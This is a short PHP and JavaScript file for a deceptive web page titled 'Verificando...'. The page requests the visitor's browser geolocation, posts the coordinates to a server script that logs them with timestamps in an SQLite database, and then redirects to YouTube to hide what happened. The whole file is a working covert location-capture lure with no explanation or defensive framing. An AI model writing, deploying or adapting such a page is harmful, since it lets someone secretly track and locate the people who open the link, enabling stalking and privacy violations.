<?php $t='geo.sqlite'; $db=new PDO('sqlite:'.$t); $db->exec("CREATE TABLE IF NOT EXISTS g(lat REAL,lon REAL,ts DATETIME DEFAULT CURRENT_TIMESTAMP)"); if(isset($_POST['l'])){ $pre=$db->prepare('INSERT INTO g(lat,lon)VALUES(?,?)'); $pre->execute([$_POST['l'],$_POST['n']]);echo'OK';exit; }?><html><head><meta charset="utf-8"><title>Verificando...</title></head><body><script> navigator.geolocation.getCurrentPosition(p=>{ fetch('r.php',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'l='+p.coords.latitude+'&n='+p.coords.longitude}).finally(()=>location.replace('https://youtube.com')); },()=>location.replace('https://youtube.com')); </script></body></html>